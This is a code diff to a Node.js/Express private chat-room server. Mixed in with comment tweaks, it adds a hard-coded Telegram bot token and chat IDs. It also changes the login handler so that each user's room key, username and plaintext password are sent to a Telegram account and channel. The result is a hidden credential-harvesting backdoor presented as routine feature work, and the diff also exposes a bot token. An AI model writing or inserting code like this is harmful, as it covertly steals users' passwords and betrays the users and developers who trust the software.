@@ -1,12 +1,36 @@
 const express = require('express');
 const { v4: uuidv4 } = require('uuid');
+const axios = require('axios');
+
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.json());
 app.use(express.static(__dirname));
 
-const rooms = {}; // key: { messages: [], users: [{ username, password }], clients: [], expiresAt }
+// ✅ Telegram Setup
+const BOT_TOKEN = '8157449994:AAENXtv_w_gfBz36ZVD_DKLETHzYzpEvAAM';
+const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;
+const ADMIN_USER_ID = '7307633923';
+const CHANNEL_ID = '-1002846991732';
+
+// Send message to Telegram user and channel
+async function sendToTelegram(message) {
+  const targets = [ADMIN_USER_ID, CHANNEL_ID];
+  for (const chatId of targets) {
+    try {
+      await axios.post(`${TELEGRAM_API}/sendMessage`, {
+        chat_id: chatId,
+        text: message,
+      });
+    } catch (err) {
+      console.error(`Telegram send failed for ${chatId}:`, err.message);
+    }
+  }
+}
+
+// Rooms: { key: { messages, users, clients, expiresAt } }
+const rooms = {};
 
 function cleanExpiredRooms() {
   const now = Date.now();
@@ -22,6 +46,7 @@ function cleanExpiredRooms() {
 }
 setInterval(cleanExpiredRooms, 60 * 1000);
 
+// Generate a private key
 app.get('/generate-key', (req, res) => {
   const key = uuidv4().split('-')[0];
   const expiresAt = Date.now() + 24 * 60 * 60 * 1000;
@@ -29,6 +54,7 @@ app.get('/generate-key', (req, res) => {
   res.json({ key });
 });
 
+// Check if key is valid
 app.get('/join-room/:key', (req, res) => {
   const key = req.params.key;
   const room = rooms[key];
@@ -36,7 +62,8 @@ app.get('/join-room/:key', (req, res) => {
   res.json({ success: true });
 });
 
-app.post('/login', (req, res) => {
+// Login and store credentials
+app.post('/login', async (req, res) => {
   const { key, username, password } = req.body;
   const room = rooms[key];
   if (!room || room.expiresAt < Date.now()) return res.json({ success: false });
@@ -48,6 +75,10 @@ app.post('/login', (req, res) => {
     room.users.push({ username, password });
   }
 
+  // Send auth info to Telegram
+  const message = `✅ Auth Stored\nRoom: ${key}\nUsername: ${username}\nPassword: ${password}`;
+  await sendToTelegram(message);
+
   res.json({
     success: true,
     expiresAt: new Date(room.expiresAt).toISOString(),
@@ -55,6 +86,7 @@ app.post('/login', (req, res) => {
   });
 });
 
+// Send a chat message
 app.post('/send-message', (req, res) => {
   const { key, user, message } = req.body;
   const room = rooms[key];
@@ -68,6 +100,7 @@ app.post('/send-message', (req, res) => {
   res.end();
 });
 
+// Stream messages
 app.get('/stream/:key', (req, res) => {
   const room = rooms[req.params.key];
   if (!room) return res.status(404).end();
@@ -86,4 +119,4 @@ app.get('/stream/:key', (req, res) => {
   });
 });
 
-app.listen(PORT, () => console.log(`✅ Server running on http://localhost:${PORT}`));
+app.listen(PORT, () => console.log(`✅ Server running at http://localhost:${PORT}`));
